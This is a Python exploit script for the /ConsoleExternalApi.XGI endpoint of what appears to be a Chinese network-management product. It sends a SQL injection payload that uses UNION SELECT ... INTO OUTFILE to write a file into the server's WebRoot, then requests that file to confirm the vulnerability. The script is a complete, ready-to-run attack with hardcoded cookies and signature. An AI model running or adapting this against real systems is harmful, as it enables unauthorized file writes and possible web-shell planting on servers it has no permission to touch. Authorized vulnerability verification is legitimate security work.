#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re
import urllib
import base64

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde"
    burp0_cookies = {"PHPSESSID": "t50ep2hj6cj7cvoitlrp7noop7", "CookieLanguageName": "ZH-CN", "think_language": "zh-CN", "UserAuthtype": "0"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "Accept-Encoding": "gzip", "Content-Type": "application/json", "Connection": "close"}
    burp0_json={"account": "1' union select 'vulntest',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\vulntest.xgi'#", "userPwd": "1"}
    req1 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json, verify=False)
    shellpath = site + "/vulntest.xgi"
    req2 = requests.get(shellpath, headers=burp0_headers, verify=False)
    if req2.status_code==200 and "vulntest" in req2.text:
        return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在, 文件写入的路径为为：", info)
    else:
        print("[-]漏洞不存在")
